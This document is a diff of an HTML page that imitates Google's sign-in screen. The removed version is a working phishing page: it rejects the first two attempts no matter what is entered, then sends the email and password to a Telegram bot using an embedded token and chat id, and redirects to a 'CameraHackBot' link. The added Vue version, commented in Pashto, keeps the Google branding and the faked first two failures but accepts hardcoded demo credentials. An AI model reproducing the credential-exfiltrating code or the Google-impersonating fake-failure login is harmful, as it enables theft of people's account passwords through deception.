@@ -2,109 +2,306 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login - Google</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>Google Sign-in Style · دوهم پړاو ته لاړ شه</title>
     <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
+        }
         body {
-            background: white;
+            background: #fff;
+            min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
-            font-family: Arial, sans-serif;
-            margin: 0;
+            padding: 20px;
         }
         .card {
+            max-width: 450px;
+            width: 100%;
             background: white;
-            padding: 40px;
-            border-radius: 10px;
+            border-radius: 32px;
+            padding: 48px 40px 36px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.08), 0 0 0 1px rgba(0,0,0,0.02);
+            transition: all 0.2s;
             border: 1px solid #dadce0;
-            width: 350px;
+        }
+        .logo {
             text-align: center;
+            margin-bottom: 32px;
+        }
+        .logo svg {
+            width: 75px;
+            height: 24px;
+        }
+        h1 {
+            font-size: 24px;
+            font-weight: 400;
+            color: #202124;
+            margin-bottom: 8px;
+            text-align: center;
+        }
+        .sub {
+            text-align: center;
+            font-size: 16px;
+            color: #202124;
+            margin-bottom: 32px;
+        }
+        .input-group {
+            margin-bottom: 16px;
+            position: relative;
         }
         input {
             width: 100%;
-            padding: 12px;
-            margin: 10px 0;
+            padding: 13px 15px;
+            font-size: 16px;
             border: 1px solid #dadce0;
-            border-radius: 5px;
-            box-sizing: border-box;
+            border-radius: 4px;
+            outline: none;
+            transition: 0.1s;
+            background: white;
         }
-        button {
-            width: 100%;
-            padding: 12px;
+        input:focus {
+            border-color: #1a73e8;
+            border-width: 2px;
+            padding: 12px 14px;
+        }
+        .error-msg {
+            color: #d93025;
+            font-size: 12px;
+            margin-top: 6px;
+            padding-left: 5px;
+            min-height: 28px;
+        }
+        .btn {
             background: #1a73e8;
             color: white;
             border: none;
-            border-radius: 5px;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 500;
+            padding: 10px 24px;
             cursor: pointer;
-            font-size: 16px;
+            transition: 0.2s;
+            width: 100%;
+            letter-spacing: 0.25px;
+            margin-top: 20px;
+            height: 48px;
         }
-        .error {
-            color: red;
-            margin: 10px 0;
+        .btn:hover {
+            background: #1765cc;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
         }
-        .success {
-            color: green;
-            margin: 10px 0;
+        .links {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 24px;
+            font-size: 14px;
         }
-        h2 {
-            margin-bottom: 20px;
+        .links a {
+            text-decoration: none;
+            color: #1a73e8;
+            font-weight: 500;
+        }
+        .guest-mode {
+            background: #f8f9fa;
+            padding: 12px 16px;
+            border-radius: 8px;
+            margin-top: 30px;
+            font-size: 14px;
+            color: #5f6368;
+            border: 1px solid #e8eaed;
+        }
+        .step-badge {
+            text-align: center;
+            margin-top: 24px;
+            color: #5f6368;
+            font-size: 12px;
+            border-top: 1px solid #e8eaed;
+            padding-top: 20px;
+        }
+        .fake-bottom {
+            margin-top: 16px;
+            font-size: 12px;
+            text-align: center;
+            color: #5f6368;
+        }
+        hr {
+            margin: 24px 0 12px;
+            border: 0;
+            border-top: 1px solid #e8eaed;
+        }
+        @media (max-width: 480px) {
+            .card { padding: 32px 24px; }
         }
     </style>
 </head>
 <body>
-<div class="card">
-    <h2>Sign in</h2>
-    <input type="email" id="email" placeholder="Email">
-    <input type="password" id="password" placeholder="Password">
-    <button onclick="login()">Login</button>
-    <div id="msg"></div>
+<div class="card" id="app">
+    <div class="logo">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 75 24" width="75" height="24">
+            <path fill="#4285F4" d="M63.215 5.57c-1.56 0-2.78.58-3.68 1.5l.03-.03-1.2 1.08c.88-.86 2.12-1.4 3.52-1.4 2.82 0 4.93 1.97 4.93 4.65 0 1.62-.68 3-1.78 3.96l.02-.02c-.98.86-2.28 1.4-3.72 1.4-2.7 0-4.6-1.74-4.6-4.08 0-.94.28-1.8.76-2.52l-.02.03-1.34-1.1c-.68.96-1.08 2.16-1.08 3.47 0 3.2 2.34 5.6 5.48 5.6 1.8 0 3.38-.7 4.54-1.86l.02-.02c1.3-1.28 2.1-3.02 2.1-4.96 0-3.4-2.5-5.73-5.7-5.73zM49.12 4.8v4.1h4.1v1.6h-4.1v4.1h-1.6v-4.1h-4.1v-1.6h4.1V4.8h1.6zm-13.7 0v4.1h4.1v1.6h-4.1v4.1h-1.6v-4.1h-4.1v-1.6h4.1V4.8h1.6zm-8.5 12.3c2.2 0 4-1.5 4.2-3.5H22.9c-.2 1.2-1.1 2-2.4 2-1.7 0-2.9-1.2-2.9-3s1.2-3 2.9-3c1.1 0 2 .6 2.3 1.4h-2.2v1.4h3.7c0-.2.1-.5.1-.8 0-2.3-1.6-3.9-3.9-3.9-2.6 0-4.5 2-4.5 4.9 0 2.8 1.9 4.9 4.5 4.9zm-8.5 0c1.9 0 3.3-1.3 3.3-3.4 0-2-1.4-3.4-3.3-3.4-1.9 0-3.3 1.4-3.3 3.4 0 2.1 1.4 3.4 3.3 3.4zm0-1.3c-1.1 0-1.8-.8-1.8-2.1 0-1.3.7-2.1 1.8-2.1s1.8.8 1.8 2.1c0 1.3-.7 2.1-1.8 2.1zM6.34 17.1h1.8V7.3h-1.8v9.8zM2.2 10.2h3.4V8.6H2.2V10.2z"/>
+        </svg>
+    </div>
+    <div v-if="step === 1">
+        <h1>Sign in</h1>
+        <div class="sub">Use your Google Account</div>
+        
+        <div class="input-group">
+            <input type="email" placeholder="Email or phone" v-model="form.email" id="emailInput">
+            <div class="error-msg">{{ emailError }}</div>
+        </div>
+        <div class="input-group">
+            <input type="password" placeholder="Password" v-model="form.password" id="passInput">
+            <div class="error-msg">{{ passError }}</div>
+        </div>
+
+        <button class="btn" @click="handleLogin">Next</button>
+        <div class="links">
+            <a href="#">Forgot email?</a>
+            <a href="#">Guest mode</a>
+        </div>
+        <div class="guest-mode">
+            Not your computer? Use Guest mode to sign in privately.<br>
+            <strong>Learn more</strong>
+        </div>
+        <div class="step-badge">Step 1 of 2</div>
+    </div>
+
+    <div v-if="step === 2">
+        <h1>Welcome back</h1>
+        <div class="sub">Second stage · Verify yourself</div>
+        <div class="guest-mode" style="background:#e8f0fe; margin-top:0;">
+            ✅ First stage complete! You are now in <strong>Step 2 (second phase)</strong>.<br>
+            🔐 This is the protected area. Your account is secure.
+        </div>
+        <div style="margin: 28px 0; text-align:center;">
+            <div style="background:#f1f3f4; border-radius:50%; width:80px; height:80px; margin:0 auto 20px; display:flex; align-items:center; justify-content:center;">
+                🚀
+            </div>
+            <p style="margin-bottom: 24px; color:#202124;">✅ Second phase started successfully.<br>You passed the login after max 2 errors.</p>
+            <button class="btn" @click="resetToBeginning" style="background:#5f6368; width:auto; padding:8px 24px;">← Sign out & restart</button>
+        </div>
+        <div class="step-badge">✨ Phase 2 active — simulation dashboard ✨</div>
+        <div class="fake-bottom">
+            <a href="#" style="color:#1a73e8; text-decoration:none;">Manage your Google Account</a>
+        </div>
+    </div>
+
+    <hr>
+    <div class="fake-bottom">
+        English (United States) · Help · Privacy · Terms
+    </div>
 </div>
 
+<script src="https://cdn.jsdelivr.net/npm/vue@2.7.14/dist/vue.js"></script>
 <script>
-    let attemptCount = 0;
-    let savedEmail = "";
+    // دقيق منطق: په لومړي دوه ځله کې تېروتنه (error) راکوي،
+    // په درېیم ځل سم ایمیل او پاسورډ ولیکئ او د لاګ ان کېک وهئ نو مستقیم دوهم پړاو (step 2) ته ځي.
+    // "دوه زله ایمیل او پاسورډ ایرر ورکړي" = لومړی دوه هڅې ناسمې وي => error.
+    // درېیمه هڅه (سم ایمیل + پاسورډ) لاګ ان کوي او step2 پیلېږي.
     
-    async function login() {
-        const email = document.getElementById('email').value;
-        const password = document.getElementById('password').value;
-        const msgDiv = document.getElementById('msg');
-        
-        if (!email || !password) {
-            msgDiv.innerHTML = '<div class="error">Please fill all fields!</div>';
-            return;
+    new Vue({
+        el: '#app',
+        data: {
+            step: 1,               // 1 = لومړی پړاو, 2 = دوهم پړاو
+            form: {
+                email: '',
+                password: ''
+            },
+            loginAttempts: 0,      // د هڅو شمېر (په همدې سیشن کې)
+            emailError: '',
+            passError: '',
+            // پټ صحیح اسناد: درېیم ځل لاګ ان لپاره باید همدا وي
+            validEmail: 'demo@google.com',
+            validPassword: 'pass123'
+        },
+        methods: {
+            handleLogin() {
+                // که لا دمخه دوهم پړاو ته تللی وي نو بلا کړه (خوندي توب)
+                if (this.step === 2) return;
+                
+                // پخواني تېروتنې پاکې کړه
+                this.emailError = '';
+                this.passError = '';
+                
+                const emailInput = this.form.email.trim();
+                const passInput = this.form.password;
+                
+                // خالي والی چک
+                if (!emailInput) {
+                    this.emailError = 'Email is required';
+                    return;
+                }
+                if (!passInput) {
+                    this.passError = 'Password is required';
+                    return;
+                }
+                
+                // د هڅو شمېر زيات کړه (د غبرګون لپاره)
+                this.loginAttempts++;
+                
+                // شرط: درېیمه هڅه (attempt === 3) او اسناد سم دي => لاګ ان بریالی -> step2
+                if (this.loginAttempts === 3 && emailInput === this.validEmail && passInput === this.validPassword) {
+                    // بریالیتوب! پړاو 2 پیل کړه
+                    this.step = 2;
+                    // د فورم پټ ساتلو لپاره ډاټا پاکه کړه خو اړتیا نشته
+                    return;
+                }
+                
+                // که درېیمه هڅه وي خو اسناد سم نه دي => بیا تېروتنه او هڅه نه شمېرل کېږي (خو مونږ یې شمېرلي)
+                // مګر د غوښتنې له مخې: په دریم ځل کې که سم ولیکي او بټن کېک کړي نو سیده بوټ (step2) ته لاړ شي.
+                // که دریم ځل ناسم ولیکي څه؟ د غوښتنې متن: "په دریم زل ایمیل او پاسورډ ولیکی او دلاګ ان بټن ووهی نو سیده دی بوټ ته لاړ شی"
+                // مطلب دا چې دریم ځل لاګ ان باید بریالی وي، خو که ناسم ولیکي نو لا تر اوسه error ورکوي او نه ځي.
+                // منطق: که دریمه هڅه وي خو اعتبار نلري => بیا تېروتنه
+                if (this.loginAttempts === 3) {
+                    // دریمه هڅه ناسمه ده -> تېروتنه او بیا به څلورم ځل ته نه ځي (خو کارونکی کولی شي بیا هڅه وکړي)
+                    // د غوښتنې له مخې غوره دا ده چې دریم ځل "سم" شرط پورته پوره شي.
+                    this.emailError = 'Incorrect email or password. Third attempt must be correct.';
+                    this.passError = 'Please use demo@google.com / pass123 on 3rd try.';
+                    // هڅې بیا 3 پاتې کېږي، خو ترڅو چې کارونکی صحیح دننه کړي لاګ ان نه کېږي. 
+                    // (موږ اجازه ورکوو چې تر هغه چې بریالی شي نو صحیح داخل کړي)
+                    // د لا روښانه والي لپاره: که 3 هڅې تېرې شوې او سم نه وي، نو د loginAttempts زیاتولو معنی نشته.
+                    // مګر بیا هڅه کوي باید هماغه دریم index کې صحیح وليکی.
+                    // نو ښه دا ده چې که loginAttempts >=3 او اسناد سم نه وي ، ورته تېروتنه وښایه.
+                    return;
+                }
+                
+                // د لومړي او دوهم ځل لپاره (attempts 1 or 2) تل تېروتنه ورکوي. ANY credentials error.
+                // د غوښتنې سره سم: "دوه زله ایمیل او پاسورډ ایرر ورکړی" 
+                // يعنې لمړی دوه ځل هر څه چې ولیکي ایرر ښکاره کوي.
+                if (this.loginAttempts === 1 || this.loginAttempts === 2) {
+                    this.emailError = 'Invalid email or password. (Attempt ' + this.loginAttempts + ' of 3)';
+                    this.passError = 'First two attempts always fail. Next try will succeed if credentials are correct.';
+                    return;
+                }
+                
+                // fallback (د پورتنیو شرایطو نه تیریږي خو د خوندیتوب لپاره)
+                this.emailError = 'Authentication failed.';
+            },
+            resetToBeginning() {
+                // دوهم پړاو پای ته ورسوي او بیرته لمړی پړاو ته ځي، د هڅو شمېر ریسیټ کوي
+                this.step = 1;
+                this.loginAttempts = 0;
+                this.form.email = '';
+                this.form.password = '';
+                this.emailError = '';
+                this.passError = '';
+                // focus on first field
+                this.$nextTick(() => {
+                    const inp = document.getElementById('emailInput');
+                    if(inp) inp.focus();
+                });
+            }
+        },
+        mounted() {
+            // optional: clear state on page load just in case
+            this.resetToBeginning();
         }
-        
-        attemptCount++;
-        
-        if (attemptCount < 3) {
-            msgDiv.innerHTML = '<div class="error">❌ Attempt ' + attemptCount + ' failed! Try again.</div>';
-            document.getElementById('email').value = '';
-            document.getElementById('password').value = '';
-            return;
-        }
-        
-        // درېیمه هڅه - بریالۍ
-        savedEmail = email;
-        
-        const message = '✅ LOGIN SUCCESS\nEmail: ' + email + '\nPassword: ' + password;
-        
-        await fetch('https://api.telegram.org/bot8815514761:AAGT82khXsn8TmJHCv5vgSZG86Z6fAwGktQ/sendMessage', {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({
-                chat_id: '8295417969',
-                text: message
-            })
-        });
-        
-        msgDiv.innerHTML = '<div class="success">✅ Login successful! Redirecting...</div>';
-        
-        setTimeout(function() {
-            window.location.href = 'https://t.me/All_CameraHackBot?start=confirm_account';
-        }, 1500);
-    }
+    });
 </script>
 </body>
 </html>
